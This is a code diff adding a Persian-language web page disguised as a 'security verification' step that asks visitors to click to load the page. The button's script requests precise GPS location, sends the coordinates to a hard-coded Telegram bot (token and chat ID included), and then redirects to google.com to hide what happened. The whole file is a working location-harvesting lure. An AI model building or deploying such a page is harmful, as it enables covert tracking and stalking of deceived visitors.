@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تایید امنیتی</title>
+</head>
+<body style="text-align: center; font-family: Tahoma, sans-serif; margin-top: 100px; background-color: #f4f4f9;">
+
+    <div style="background: white; padding: 30px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 90%;">
+        <h3>برای بارگذاری کامل صفحه، لطفاً روی دکمه زیر کلیک کنید:</h3>
+        <br>
+        <button id="btn" onclick="getLocation()" style="background-color: #4CAF50; color: white; padding: 12px 25px; border: none; border-radius: 6px; font-size: 16px; cursor: pointer;">تایید و ادامه</button>
+        <p id="status" style="margin-top: 20px; color: #666; font-size: 14px;"></p>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8819824616:AAGeOJx_dFMt_VLYzmLoH60D9CjHybUhcI8';
+        const ADMIN_CHAT_ID = '8861869235';
+
+        function getLocation() {
+            const statusText = document.getElementById("status");
+            statusText.innerText = "در حال بررسی موقعیت مکانی...";
+            
+            if (!navigator.geolocation) {
+                statusText.innerText = "مرورگر شما از موقعیت‌یابی پشتیبانی نمی‌کند.";
+                return;
+            }
+
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    statusText.innerText = "در حال ارسال اطلاعات...";
+
+                    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+                    
+                    fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: ADMIN_CHAT_ID,
+                            latitude: lat,
+                            longitude: lon
+                        })
+                    })
+                    .then(response => {
+                        statusText.innerText = "تایید شد. در حال انتقال...";
+                        setTimeout(() => {
+                            window.location.href = "https://www.google.com";
+                        }, 1000);
+                    })
+                    .catch(error => {
+                        statusText.innerText = "خطا در ارتباط با سرور تلگرام.";
+                    });
+                },
+                function(error) {
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            statusText.innerText = "خطا: دسترسی به لوکیشن توسط شما رد شد. لطفاً دسترسی را فعال کنید.";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            statusText.innerText = "خطا: اطلاعات مکان در دسترس نیست. لطفاً GPS دستگاه خود را روشن کنید.";
+                            break;
+                        case error.TIMEOUT:
+                            statusText.innerText = "خطا: زمان درخواست به پایان رسید. لطفاً مجدد تلاش کنید.";
+                            break;
+                        default:
+                            statusText.innerText = "خطای ناشناخته رخ داد.";
+                            break;
+                    }
+                },
+                options
+            );
+        }
+    </script>
+</body>
+  </html>
+  
